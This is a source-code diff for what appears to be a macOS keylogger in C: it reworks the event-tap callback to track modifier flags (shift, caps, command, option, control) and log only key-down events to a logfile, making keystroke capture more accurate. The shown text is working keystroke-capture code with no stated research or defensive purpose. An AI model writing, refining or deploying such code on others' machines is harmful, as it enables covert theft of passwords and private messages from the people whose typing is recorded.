@@ -1,9 +1,6 @@
 #include "keylogger.h"
 
-int keyCodeCache[127];
-int capsLock = 57;
-int leftShift = 56;
-int rightShift = 60;
+CGEventFlags lastFlags = 0;
 
 int main(int argc, const char *argv[]) {
 
@@ -64,17 +61,50 @@ CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef e
         return event;
     }
 
+    CGEventFlags flags = CGEventGetFlags(event);
+
     // Retrieve the incoming keycode.
     CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
 
-    if (keyCode == leftShift || keyCode == rightShift || keyCode == capsLock) {
-        keyCodeCache[keyCode] = keyCodeCache[keyCode] == 1 ? 0 : 1;
+    // Calculate key up/down.
+    bool down = false;
+    if (type == kCGEventFlagsChanged) {
+        switch (keyCode) {
+        case 54: // [right-cmd]
+        case 55: // [left-cmd]
+            down = (flags & kCGEventFlagMaskCommand) && !(lastFlags & kCGEventFlagMaskCommand);
+            break;
+        case 56: // [left-shift]
+        case 60: // [right-shift]
+            down = (flags & kCGEventFlagMaskShift) && !(lastFlags & kCGEventFlagMaskShift);
+            break;
+        case 58: // [left-option]
+        case 61: // [right-option]
+            down = (flags & kCGEventFlagMaskAlternate) && !(lastFlags & kCGEventFlagMaskAlternate);
+            break;
+        case 59: // [left-ctrl]
+        case 62: // [right-ctrl]
+            down = (flags & kCGEventFlagMaskControl) && !(lastFlags & kCGEventFlagMaskControl);
+            break;
+        case 57: // [caps]
+            down = (flags & kCGEventFlagMaskAlphaShift) && !(lastFlags & kCGEventFlagMaskAlphaShift);
+            break;
+        default:
+            break;
+        }
+    } else if (type == kCGEventKeyDown) {
+        down = true;
+    }
+    lastFlags = flags;
+
+    // Only log key down events.
+    if (!down) {
         return event;
     }
 
     // Print the human readable key to the logfile.
-    bool shift = keyCodeCache[rightShift] + keyCodeCache[leftShift] > 0;
-    bool caps = keyCodeCache[capsLock] == 1;
+    bool shift = flags & kCGEventFlagMaskShift;
+    bool caps = flags & kCGEventFlagMaskAlphaShift;
     fprintf(logfile, "%s", convertKeyCode(keyCode, shift, caps));
     fflush(logfile);
     return event;
